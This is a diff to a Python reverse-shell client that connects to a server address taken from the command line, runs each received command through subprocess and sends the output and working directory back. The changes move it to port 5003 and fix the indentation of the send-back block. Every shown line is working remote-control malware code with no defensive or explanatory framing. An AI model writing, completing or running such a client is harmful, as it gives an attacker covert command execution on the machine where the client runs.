@@ -1,7 +1,7 @@
 import socket, os, subprocess, sys
 
 SERVER_HOST = sys.argv[1]
-SERVER_PORT = 1234
+SERVER_PORT = 5003
 BUFFER_SIZE = 1024 * 128
 
 SEPERATOR = "<sep>"
@@ -34,8 +34,9 @@ while True:
     else:
         # execute the command and retrieve the results
         output = subprocess.getoutput(command)
-        # get the results back to the server
-        message = f"{output}{SEPERATOR}{cwd}"
-        s.send(message.encode())
-    # close client connection
-    s.close()
+    # get the results back to the server
+    cwd = os.getcwd()
+    message = f"{output}{SEPERATOR}{cwd}"
+    s.send(message.encode())
+# close client connection
+s.close()
